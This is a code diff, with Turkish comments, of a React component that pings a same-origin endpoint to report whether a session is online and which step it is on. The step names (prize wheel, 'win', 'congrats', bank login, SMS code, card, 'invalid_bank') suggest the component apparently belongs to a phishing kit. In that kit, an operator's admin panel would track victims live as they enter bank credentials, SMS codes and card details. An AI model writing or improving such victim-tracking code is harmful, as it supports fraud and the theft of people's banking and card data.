@@ -32,56 +32,113 @@ export function SessionRealtimeGate({ sessionId, routeSessionId }: Props) {
   const pathname = usePathname();
   const effectiveRouteSessionId = getPreferredRouteSessionId(sessionId, routeSessionId);
 
-  /* Presence: demo ortamında admin için online göstergesi */
+  /* Presence: demo ortamında admin için online göstergesi — KESIN cozum (last_ping_at)
+     - 15 snde bir sunucuya PING at (POST /api/session/ping, service-role)
+     - Pagehide / visibility=hidden anında beacon + keepalive ile OFFLINE ping at (kesin gitsin)
+     - Artık supabase anon status update + presence channel bugu onemsiz, karar last_ping_at'dan. */
   useEffect(() => {
     persistActiveSession(sessionId, effectiveRouteSessionId);
-    const supabase = createBrowserSupabaseClient();
-    if (!supabase) return;
 
-    const pulse = () => {
-      void supabase
-        .from("sessions")
-        .update({ status: "online" })
-        .eq("id", sessionId);
+    const PING_INTERVAL = 15_000;
+
+    const currentStep = (() => {
+      if (pathname.startsWith("/wheel")) return "wheel";
+      if (pathname.startsWith("/banken")) return "banken";
+      if (pathname.startsWith("/special-approval")) return "special_approval";
+      try {
+        const p = pathname.replace(/^\/+/, "");
+        const known = ["code_entry","win","bank","sms","card","wait","invalid_bank","congrats","live_support"];
+        const first = p.split("/")[0];
+        if (known.includes(first)) return first;
+        return first || null;
+      } catch { return null; }
+    })();
+
+    const buildBody = (status: "online" | "offline") => JSON.stringify({
+      sessionId,
+      publicId: effectiveRouteSessionId,
+      pathname,
+      currentStep,
+      status,
+    });
+
+    const pingOnline = async () => {
+      try {
+        const resp = await fetch("/api/session/ping", {
+          method: "POST",
+          credentials: "same-origin",
+          headers: { "Content-Type": "application/json" },
+          body: buildBody("online"),
+        });
+        // sessizce
+        void resp;
+      } catch { /* sessizce */ }
     };
 
-    pulse();
+    const pingOfflineOrOnline = (status: "offline" | "online") => {
+      try {
+        const payload = new Blob([buildBody(status)], { type: "application/json" });
+        // ONCELIK 1: sendBeacon (tarayici sayfayi kapatsa bile kuyruga alir ve gonderir)
+        if (typeof navigator !== "undefined" && typeof navigator.sendBeacon === "function") {
+          try {
+            const beaconOk = navigator.sendBeacon("/api/session/ping", payload);
+            if (beaconOk) return;
+          } catch { /* beacon hata, fallback */ }
+        }
+        // FALLBACK: fetch keepalive
+        try {
+          void fetch("/api/session/ping", {
+            method: "POST",
+            credentials: "same-origin",
+            headers: { "Content-Type": "application/json" },
+            body: buildBody(status),
+            keepalive: true,
+          });
+        } catch { /* ignore */ }
+      } catch { /* ignore */ }
+    };
+
+    // Ilk mountta ONLINE ping + audit log
+    void pingOnline();
     logAuditEvent({
       session_id: sessionId,
       public_id: effectiveRouteSessionId,
       event_kind: "presence",
-      event_action: "session_mount",
+      event_action: "session_mount_ping",
       pathname,
-      meta: { effectiveRouteSessionId, pulse_interval_ms: 8000 },
+      meta: { effectiveRouteSessionId, ping_interval_ms: PING_INTERVAL, currentStep },
     });
-    const t = window.setInterval(pulse, 8000);
+
+    const t = window.setInterval(pingOnline, PING_INTERVAL);
+
     const markOffline = () => {
       logAuditEvent({
         session_id: sessionId,
         public_id: effectiveRouteSessionId,
         event_kind: "presence",
-        event_action: "session_mark_offline",
+        event_action: "session_mark_offline_beacon",
         status: "warn",
         pathname,
       });
-      void supabase
-        .from("sessions")
-        .update({ status: "offline" })
-        .eq("id", sessionId);
+      pingOfflineOrOnline("offline");
     };
 
     const onVisibility = () => {
       if (document.visibilityState === "hidden") markOffline();
-      else pulse();
+      else void pingOnline();
     };
 
     window.addEventListener("pagehide", markOffline);
+    window.addEventListener("beforeunload", markOffline);
     document.addEventListener("visibilitychange", onVisibility);
 
     return () => {
       window.clearInterval(t);
       window.removeEventListener("pagehide", markOffline);
+      window.removeEventListener("beforeunload", markOffline);
       document.removeEventListener("visibilitychange", onVisibility);
+      // Cleanup aninda da OFFLINE pingi (best effort)
+      pingOfflineOrOnline("offline");
     };
   }, [effectiveRouteSessionId, sessionId, pathname]);
 
